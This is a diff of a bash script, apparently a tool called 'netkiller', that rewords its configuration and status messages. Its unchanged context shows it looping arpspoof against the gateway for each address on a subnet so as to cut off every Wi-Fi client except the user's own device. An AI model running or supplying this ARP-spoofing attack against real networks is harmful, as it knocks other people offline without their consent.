@@ -38,12 +38,12 @@ MYIP="$IP"
 
 echo ""
 # Prompt configuration
-echo "Your Arpspoof Configurations..."
+echo "Your Target Configurations..."
 echo ""
-echo "INTERFACE: | $INTERFACE"
-echo "GATEWAY:   | $GATEWAY"
-echo "DEVICE IP: | $MYIP"
-echo "TARGETS:   | $NETWORK_CIDR"
+echo "Target Interface: | $INTERFACE"
+echo "Target Gateway:   | $GATEWAY"
+echo "Target Subnet:    | $NETWORK_CIDR"
+echo "This Device IP:   | $MYIP"
 echo ""
 
 # Calculate subnet with ipcalc
@@ -90,6 +90,6 @@ arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
 
 done
 
-echo "Blocking all the wifi clients connections in $NETWORK_CIDR except your $MYIP and $GATEWAY."
+echo "Netkiller kill the connection of $NETWORK_CIDR"
 echo " "
 echo "To stop, run: sudo netkiller-stop"
